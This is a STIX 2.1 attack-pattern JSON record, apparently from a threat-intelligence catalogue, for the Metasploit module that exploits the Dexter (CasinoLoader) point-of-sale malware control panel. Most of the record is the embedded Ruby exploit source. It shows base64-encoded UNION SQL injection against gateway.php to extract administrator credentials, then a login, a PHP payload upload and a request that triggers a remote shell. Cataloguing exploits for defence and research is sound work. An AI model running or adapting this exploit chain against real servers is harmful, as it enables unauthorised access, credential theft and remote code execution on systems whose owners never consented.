{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93b9527b-4418-4b68-b6cd-1ff5c2a4fbe9",
    "created": "2024-08-14T17:08:09.828423Z",
    "modified": "2024-08-14T17:08:09.828427Z",
    "name": "\"Dexter (CasinoLoader) SQL Injection\"",
    "description": " This module exploits a vulnerability found in the command and control panel used to control Dexter (Point of Sale malware).  This is done by accessing the PHP page used by bots to report in (gateway.php) which does not sanitize input. Input is encrypted and encoded, but the key is supplied by the bot connecting. The 'page' parameter is used in this case.  The command and control panel designates a location to upload files, and can be used as a reliable location to write a PHP shell.  Authentication is not needed to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/dexter_casinoloader_exec.rb",
            "external_id": "dexter_casinoloader_exec.rb"
        },
        {
            "source_name": "\"URL\"",
            "external_id": "\"http://www.xylibox.com/2013/08/point-of-sale-malware-infostealerdexter.html\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Dexter (CasinoLoader) SQL Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in the command and control panel\n        used to control Dexter (Point of Sale malware).  This is done by accessing the\n        PHP page used by bots to report in (gateway.php) which does not sanitize input.\n        Input is encrypted and encoded, but the key is supplied by the bot connecting.\n        The 'page' parameter is used in this case.  The command and control panel designates\n        a location to upload files, and can be used as a reliable location to write a\n        PHP shell.  Authentication is not needed to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bwall (Brian Wallace) <bwallace[at]cylance.com>'\n        ],\n      'References'     =>\n        [\n          [\n            \"URL\", \"http://www.xylibox.com/2013/08/point-of-sale-malware-infostealerdexter.html\"\n          ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['CasinoLoader gateway.php', {}]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-02-08'\n    ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The path to the CasinoLoader root folder', '/']),\n          OptString.new('TARGETGATEWAY', [true, 'Name of bot gateway page', 'gateway.php']),\n          OptString.new('TARGETLOGIN', [true, 'Name of panel login page', 'index.php']),\n          OptString.new('TARGETUPLOAD', [true, 'Name of panel upload page', 'upload.php']),\n          OptString.new('TARGETDATABASEUSERTABLE', [true, 'Table in database that holds admin data', 'users'])\n        ])\n  end\n\n  def gateway\n    return normalize_uri(target_uri.path, datastore['TARGETGATEWAY'])\n  end\n\n  def login\n    return normalize_uri(target_uri.path, datastore['TARGETLOGIN'])\n  end\n\n  def upload\n    return normalize_uri(target_uri.path, datastore['TARGETUPLOAD'])\n  end\n\n  def database_get_field(table, column, row)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'=>gateway,\n      'vars_post' => {\n        'val' => 'AA==',\n        'page' => Rex::Text.encode_base64(\"' AND 1=2 UNION ALL SELECT 1,\" + column + \",3 FROM \" + table + \" LIMIT 1 OFFSET \" + row.to_s + \" -- --\")\n      }\n    })\n    if res and !res.get_cookies.empty? and res.get_cookies.start_with?('response=')\n      return Rex::Text.decode_base64(URI.unescape(res.get_cookies['response='.length..-1]))[1..-3]\n    end\n    return false\n  end\n\n  def check\n    testvalue = rand_text_alpha(9)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'=>gateway,\n      'vars_post' => {\n        'val' => 'AA==',\n        'page' => Rex::Text.encode_base64(\"' AND 1=2 UNION ALL SELECT 1,'\" + testvalue + \"',3 -- --\")\n      }\n    })\n\n    if res and !res.get_cookies.empty? and res.get_cookies.start_with?('response=') and\n      Rex::Text.decode_base64(URI.unescape(res.get_cookies['response='.length..-1])) == '$' + testvalue + ';#' and database_get_field('users', 'name', 0) != false\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    payload_name = rand_text_alpha(rand(10) + 5) + '.php'\n\n    print_status(\"Using SQL injection to acquire credentials\")\n    user = database_get_field('users', 'name', 0)\n    if user == false\n      print_error(\"Failed to acquire administrator username\")\n      return\n    end\n\n    password = database_get_field('users', 'password', 0)\n    if password == false\n      print_error(\"Failed to acquire administrator password\")\n    end\n\n    print_status(\"Using #{user}:#{password}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'=>login,\n      'vars_post' => {\n        'submit' => '1',\n        'username' => user,\n        'password' => password\n      }\n    })\n\n    login_cookie = \"\"\n\n    if res and res.headers.has_key?('Location')\n      login_cookie = res.get_cookies\n      print_good(\"Login Successful\")\n    else\n      print_error(\"Failed to log in\")\n      return\n    end\n\n    data = Rex::MIME::Message.new\n    data.add_part(\"MAX_FILE_SIZE\", nil, nil, 'form-data; name=\"MAX_FILE_SIZE\"')\n    data.add_part(\"<?php #{payload.encoded} ?>\", nil, nil, \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_name}\\\"\")\n    post_data = data.to_s\n\n    print_status(\"Sending PHP payload (#{payload_name})\")\n    res = send_request_cgi({\n        'method' => 'POST',\n        'uri'    => upload,\n        'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n        'cookie' => login_cookie,\n        'data'   => post_data\n    })\n\n    if res and res.code == 200 and res.body =~ /a href=\"upload.php\\?del=(.*)\">/\n      path = $1\n      path = path.sub! \"\\\\\", \"/\"\n      target_path = normalize_uri(target_uri.path, path)\n      print_status(\"Requesting: #{target_path}\")\n      send_request_raw({'uri' => normalize_uri(target_path)})\n      handler\n    else\n      print_error(\"Failed to upload file\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-08",
    "x_mitre_platforms": [
        "['php']"
    ]
}